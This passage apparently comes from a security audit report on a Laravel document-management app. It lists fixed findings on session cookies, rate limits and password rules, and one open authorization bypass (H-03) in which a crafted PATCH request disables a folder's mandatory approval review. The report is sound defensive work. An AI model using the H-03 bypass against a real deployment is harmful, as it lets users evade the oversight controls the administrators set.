Replaces any character outside word chars, spaces, hyphens, dots, and parentheses with `_`. Preserves common filename patterns like `GO-123 (2024).pdf` while eliminating `"`, `<`, `>`, `;`, and other special characters.

**Files changed:**  
`app/Http/Controllers/DocumentController.php`

---

### L-03 · Department Binding Silent Default for Unknown Level Aliases

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
The `{department}` route binding used `default => 'department_level'` in its `match` expression, meaning any unrecognised `{level}` alias (e.g. `/documents/xyz/...`) silently resolved to `department_level` instead of returning 404. While not directly exploitable, it masked routing bugs and created undocumented implicit behaviour.

**Fix applied:**  
Replaced with an explicit two-branch match that aborts 404 for any unrecognised alias:

```php
$level = match($alias) {
    'dept'  => 'department_level',
    'sectt' => 'secretariat_level',
    default => abort(404),
};
```

**Files changed:**  
`app/Providers/AppServiceProvider.php`

---

### Upload Rate Limit Capped

**Severity:** MEDIUM (operational risk)  
**Status:** FIXED

**Previous behaviour:**  
Upload limiter was 60 requests/minute per user — matching the general mutations limiter. At a 50 MB file cap, worst-case throughput was 3 GB/min per user.

**Fix applied:**  
Reduced to 20 requests/minute. This still allows comfortable bulk initial-data-entry batches (20 files/min) while capping worst-case disk I/O at 1 GB/min. Once the initial document load is complete and uploads are 1–2 files at a time, reduce further to 5–10/min by changing the single constant in `AppServiceProvider::configureRateLimiters()`.

**Files changed:**  
`app/Providers/AppServiceProvider.php`

---

## Passing Checks — Confirmed Pre-Existing (No Remediation Required)

The following areas were audited and found to be correctly implemented before this remediation pass.

| Area | Verdict |
|------|---------|
| Authenticated action audit trail (`activity_logs`, `LogMutation` middleware, Login listener) | ✓ PASS |
| File upload MIME validation (`mimetypes:` magic-byte check, not `mimes:`) | ✓ PASS |
| Directory traversal via vault path (slugs go through `HasUnicodeSlug::makeSlug()`) | ✓ PASS |
| Privilege escalation via `UpdateProfileRequest` (no role/privilege fields on self-edit) | ✓ PASS |
| CSRF protection (all mutations in `web` middleware group; AJAX sets `X-CSRF-TOKEN`) | ✓ PASS |
| SQL injection (Eloquent/Query Builder parameterized bindings throughout) | ✓ PASS |
| Mass assignment protection (explicit `$fillable` on all models, no `$guarded = []`) | ✓ PASS |
| Login brute-force rate limiting (5/min per email+IP + 10/min per IP — dual-key, fixed in A-01) | ✓ PASS |
| XSS via Blade auto-escape (`{{ }}` on all user data in templates) | ✓ PASS |
| Self-delete guard in `UserManagementController@destroy` | ✓ PASS |
| Two-stage soft/hard delete (files never removed on soft-delete) | ✓ PASS |
| `prepareForValidation()` sanitation on all Form Requests | ✓ PASS |
| Password not logged (`$request->except(['password', 'password_confirmation'])`) | ✓ PASS |
| Admin routes double-gated (`is_admin` middleware + Form Request `authorize()`) | ✓ PASS |
| Privilege whitelist enforced at validation (`User::PRIVILEGES` `in:` rule) | ✓ PASS |

---

## Pass 3 — Detailed Findings (M29 Folders Module, 2026-07-04)

---

### H-03 · `requires_approval` Toggle Settable by Any Scoped Uploader (Authorization Bypass)

**Severity:** HIGH
**Status:** **OPEN — not yet fixed, remediation planned**

**Vulnerability:**
`UpdateFolderRequest::rules()` gates the `requires_approval` field like this:

```php
$canToggleApproval = $user && (
    $user->isAdmin() || $user->hasPrivilege('department.head') || $user->hasPrivilege('section.head')
);

return [
    ...,
    'requires_approval' => $canToggleApproval ? ['nullable', 'boolean'] : [],
];
```

The intent is to restrict who can flip the maker-checker approval gate on a folder. But an **empty rules array does not remove the key from `$request->validated()`** — it only means "no constraints are applied to it." Laravel's validator still includes any key present in the `rules()` array (even `[]`) in `validated()` as long as the client sent that field. Confirmed directly:

```php
$validator = Validator::make(['requires_approval' => '1'], ['requires_approval' => []]);
$validator->passes();     // true
$validator->validated();  // ['requires_approval' => '1'] — included despite the empty ruleset
```

`FolderController::doUpdate()` then does `$folder->update($request->validated())`, and `Folder::$fillable` includes `requires_approval`, so the value passes straight through mass assignment. **The `$canToggleApproval` check has zero actual effect on the outcome** — it only controls whether the *edit form* renders the checkbox. The request's `authorize()` gate is `canUploadTo($context)` (upload scope), not a privilege check, so any user who can upload to a folder's section/division — including a legacy "upload-only" operator with global scope (see architecture decision #17) — can send a raw `PATCH` with `requires_approval=0` and disable the folder's mandatory-review policy, or `requires_approval=1` to force it on.

**Exploit scenario:**
An operator seeded with only `documents.upload` and no `section_id`/`division_id` has `uploadScope() === 'global'`, so `canUploadTo()` returns `true` for every folder. That operator can `PATCH /departments/dept/excise/sections/legal/folders/sensitive-case-file` with `requires_approval=0` in the body, silently turning off maker-checker review on a folder an admin deliberately flagged for mandatory oversight — letting subsequent uploads (their own or a colleague's) skip approval and become immediately visible.

**Planned fix (not yet applied):**
Strip the field explicitly instead of relying on an empty ruleset:

```php
$data = $request->validated();
if (! $canToggleApproval) {
    unset($data['requires_approval']);
}
$folder->update($data);
```

**Note:** `UpdateDivisionRequest` and `UpdateSectionRequest` use the identical `$canToggleApproval ? [...] : []` idiom and are very likely affected the same way. They predate this pass and weren't touched by the M29 diff, so they're out of scope here — but should get the same fix in a follow-up pass.

**Files affected:**
`app/Http/Requests/UpdateFolderRequest.php` · `app/Http/Controllers/FolderController.php` (`doUpdate()`)

---

---

## Pass 2 — Detailed Findings & Mitigations (Auth / Fortify / Session)

---

### A-01 · `FortifyServiceProvider` Overwrote the Dual-Key Login Rate Limiter

**Severity:** HIGH  
**Status:** FIXED

**Vulnerability:**  
`AppServiceProvider::configureRateLimiters()` defined a dual-key `login` limiter:
- 5 attempts per minute keyed by `email + IP` (prevents targeted account brute-force)
- 10 attempts per minute keyed by `IP` alone (prevents credential-stuffing one IP across many accounts)

`FortifyServiceProvider::boot()` also called `RateLimiter::for('login', ...)` with a single-key limiter (email+IP only, 5/min). Service providers boot in registration order — `FortifyServiceProvider` is listed after `AppServiceProvider` in `bootstrap/providers.php`. The second `RateLimiter::for('login')` call silently **replaced** the first, discarding the IP-only cap entirely. An attacker could spray thousands of email+password combinations from a single IP at 5 attempts per email per minute, unlimited across emails.

**Fix applied:**  
Removed the duplicate `RateLimiter::for('login', ...)` block from `FortifyServiceProvider`. The view registration (`Fortify::loginView(...)`) is preserved. The `AppServiceProvider` dual-key definition is now the sole, authoritative limiter.

**Files changed:**  
`app/Providers/FortifyServiceProvider.php`

---

### A-02 · `Password::defaults()` Not Configured — Fortify Actions Used Bare min-8 Rule

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
`PasswordValidationRules::passwordRules()` (used by all Fortify action classes) returns `Password::default()`. Without a `Password::defaults(fn...)` call in any service provider, `Password::default()` resolved to a bare `Password(min: 8)` — no mixed case, no numbers, no symbols. Meanwhile `StoreUserRequest`, `UpdateUserRequest`, and `UpdateProfileRequest` all correctly used `Password::min(8)->mixedCase()->numbers()->symbols()`. This divergence meant that if Fortify password reset or profile update features were ever re-enabled, they would accept `12345678` where the admin form would reject it.

**Fix applied:**  
Added to `AppServiceProvider::boot()` (before rate limiters):

```php
Password::defaults(
    fn () => Password::min(8)->mixedCase()->numbers()->symbols()
);
```

All uses of `Password::default()` — both in Fortify actions and any future Form Requests — now resolve to the same strong policy without duplicating the rule.

**Files changed:**  
`app/Providers/AppServiceProvider.php`

---

### A-03 · `SESSION_SECURE_COOKIE` Not Set

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
`config/session.php` reads `env('SESSION_SECURE_COOKIE')` which defaults to `null` (falsy). Neither `.env` nor `.env.example` set this key. On the SDC HTTPS deployment, the session cookie would be transmitted without the `Secure` flag — allowing it to be sent over a plain HTTP connection if a user navigates to `http://` before the HTTPS redirect fires, or if an intermediate proxy strips TLS.

**Fix applied:**  
- Added `SESSION_SECURE_COOKIE=false` to `.env` (local HTTP dev — correct)
- Added `SESSION_SECURE_COOKIE=false` to `.env.example` with a comment: **PRODUCTION (HTTPS): must be `true`**

The production `.env` on the SDC server must set this to `true`.

**Files changed:**  
`.env` · `.env.example`

---

### A-04 · "Remember Me" Checkbox Enabled 5-Year Session Persistence

**Severity:** MEDIUM  
**Status:** FIXED

**Vulnerability:**  
The login form included a "Keep me signed in" checkbox (`name="remember"`). When checked, Fortify/Laravel sets a long-lived remember-me cookie (default: 5 years via `remember_token`). This completely bypasses the 120-minute `SESSION_LIFETIME`. On a shared government workstation where an officer checks this box, the account remains accessible indefinitely across browser restarts, OS logins, and shift changes.

**Fix applied:**  
Removed the remember-me checkbox and label from `resources/views/auth/login.blade.php`. Sessions are now bounded exclusively by `SESSION_LIFETIME` (120 minutes) and `SESSION_EXPIRE_ON_CLOSE` (now `true`).

**Files changed:**  
`resources/views/auth/login.blade.php`

---

### A-05 · `SESSION_EXPIRE_ON_CLOSE=false`

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
With the default `false`, closing the browser window did not invalidate the session. The 120-minute TTL continued to tick from the last request. On a shared desktop, another user opening the browser shortly after could resume an active authenticated session.

**Fix applied:**  
Set `SESSION_EXPIRE_ON_CLOSE=true` in `.env` and `.env.example`. Sessions now expire when the browser closes, in addition to the 120-minute inactivity timeout.

**Files changed:**  
`.env` · `.env.example`

---

### A-06 · `SESSION_SAME_SITE=lax`

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
`lax` allows the session cookie to be sent on top-level cross-site navigations (e.g., clicking an external link that redirects to this app). For an internal government tool with no OAuth flows or external redirect dependencies, `strict` is the correct value — it prevents the session cookie from being attached to any cross-site request, even GET navigations from external pages.

**Fix applied:**  
Set `SESSION_SAME_SITE=strict` in `.env` and `.env.example`. CSRF tokens still protect all mutations; `strict` adds an additional layer for session-based attacks.

**Files changed:**  
`.env` · `.env.example`

---

### A-07 · `SESSION_ENCRYPT=false` — Session Data in Plain Text

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
Session data (including authentication state, CSRF tokens, and flash messages) was stored unencrypted in the `sessions` table. Direct database read access — possible for a DBA, backup process, or compromised DB credential — would expose active session tokens that could be used to impersonate authenticated users without knowing their passwords.

**Fix applied:**  
Set `SESSION_ENCRYPT=true` in `.env` and `.env.example`. Laravel encrypts session data using `APP_KEY` before writing to the DB. `APP_KEY` must be set and kept secret.

**Files changed:**  
`.env` · `.env.example`

---

### A-08 · `APP_DEBUG=true` in `.env.example` Without Production Warning

**Severity:** LOW  
**Status:** FIXED

**Vulnerability:**  
`.env.example` had `APP_DEBUG=true` with no warning. A developer deploying to the SDC server by copying `.env.example` verbatim would run the application in debug mode, exposing full stack traces (including DB credentials, file paths, and application internals) to any user who triggered an error.

**Fix applied:**  
Added inline production-guidance comments to `APP_ENV` and `APP_DEBUG` in `.env.example`:
```
APP_ENV=local    # PRODUCTION: set to 'production'
APP_DEBUG=true   # PRODUCTION: must be 'false' — true leaks stack traces
```

**Files changed:**  
`.env.example`

---

## Passing Checks — Confirmed Pre-Existing (No Remediation Required)

These are not vulnerabilities in the current state but should be addressed before the application handles sensitive classified data.

1. **Migrate off Tailwind Play CDN** — Use a compiled Tailwind build so `unsafe-inline` can be removed from the CSP `script-src` directive, replacing it with explicit nonces. Play CDN is not suitable for production NIC deployments.

2. **Add `ezyang/htmlpurifier`** — Replace the `preg_replace` Parsedown post-processor (M-03) with a full HTML purifier for a more robust allowlist-based approach. Relevant once Markdown extraction is in active use.

3. **Tighten upload rate limit after initial data entry** — Change `Limit::perMinute(20)` to `Limit::perMinute(5)` in `AppServiceProvider::configureRateLimiters()` once the legacy document backlog is loaded.

4. **Add an admin-only archive-letter download route** — Archive letters are now on the private disk (inaccessible via URL). Add `GET /admin/archive-letters/{document_id}` → streams from `Storage::disk('local')` after `hasPrivilege('documents.force-delete')` check, so admins can retrieve letters without filesystem access.

5. **Enable HSTS preload after HTTPS is stable** — Once the SDC deployment has a stable TLS certificate, add `preload` to the HSTS header and submit the domain to the HSTS preload list.

6. **Add `activity_logs` retention/rotation policy** — The table is append-only with no TTL. For long-running deployments define a retention window (e.g. 1–2 years) and a scheduled `php artisan` command to hard-delete rows older than that threshold. Log rows older than the retention window lose legal relevance anyway. Alternatively, export aged rows to a CSV/archive before deletion.

---

*Audit and remediation completed 2026-06-24. Pass 3 (M29 Folders) added 2026-07-04, with H-03 left open. Pass 4 (M30 Text Extraction & Markdown Conversion Pipeline) added 2026-07-13, with L-04 left open. Re-audit recommended after any significant change to upload, authentication, or access-control logic.*
